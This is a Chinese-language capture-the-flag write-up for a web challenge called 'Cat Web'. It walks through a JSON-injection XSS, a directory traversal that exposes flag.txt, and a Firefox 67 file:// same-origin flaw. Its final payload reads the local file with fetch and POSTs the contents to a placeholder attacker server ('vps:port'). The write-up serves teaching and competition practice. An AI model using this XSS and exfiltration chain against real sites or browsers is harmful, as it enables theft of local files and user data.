# Cat Web

很有趣的一道题。

1. XSS

    首页通过请求`/cats`得到猫猫图列表，首先测试可以发现`/cats`返回的json没有转义，用引号即可逃逸出去。因为首页js里写了判断需要返回`'status':'ok'`，这里重新写一遍即可覆盖掉之前的值。我们可以伪造一个`contents`数组，即可在首页执行任意代码。

    ```
    GET /cats?kind=black","status":"ok","content":["\"%20/><img%20src=x%20onerror=\"alert(1)\"%20/>"],"cat":"

    > {"status": "error", "content": "black","status":"ok","content":["\" /><img src=x onerror=\"alert(1)\" />"],"cat":" could not be found"}
    ```

    不过拿这个去report，发现并没有拿到任何cookie，说明要通过其他方式拿到flag。

2. 目录穿越

    题目给了提示，得到flag的位置是题目的一部分。我们从现有的接口来找突破口，不难发现`/cats`这里还存在任意列目录：

    ```
    GET /cats?kind=../templates

    > {"status": "ok", "content": ["report.html", "index.html", "flag.txt"]}
    >s
    ```

    Flag原来猫在这里。那么怎么得到它呢？最先想到的是SSTI，但是能输入的地方测试后发现不行。在机器上逐个目录检查，也没有发现本机在内网中开了其他服务。这个report意义何在呢？既然没有限制report的路径，那么说明还是要结合这个XSS获取到域内某些特定的信息。

3. Firefox 67 file:// 同源策略利用

    根据服务器打过来的user-agent，我们发现服务端用的是selenium，后端是Firefox 67，比较老的版本。查询一下68相比67修补的漏洞，发现一个比较有趣的帖子：[Treating file: URIs as unique origins](https://bugzilla.mozilla.org/show_bug.cgi?id=1500453)。简单地讲，就是当浏览file:///uri下的网页时，其相同文件夹下，以及子文件夹下的文件都会被视为同源，可以作为src或被js获取到。这样的问题是比较容易被坏人利用，比如将html下载到/user/Downloads文件夹后，打开这个html，其内部的恶意代码便可获取到该文件夹下所有内容。所以在Firefox 68中采用了更严格的策略。

    那么我们怎么利用这个问题呢，可以注意到，和flag.txt相同文件夹下有index.html，而其中对`http://catweb.zajebistyc.tf/cats`的请求又是写死的，我们的xss payload依旧可以使用。这使得我们可以通过js读本地文件flag.txt，再发给我们自己。

    构造下面的url，然后report即可得到flag。

    ```
    file:///app/templates/index.html?black","status":"ok","content":["\" /><img src=x onerror=\"fetch('file:///app/templates/flag.txt').then(function(s){s.body.getReader().read().then(function(s){$.post('http://vps:port/',String(s.value))})})\" />"],"cat":"#
    ```

    `p4{can_i_haz_a_piece_of_flag_pliz?}`
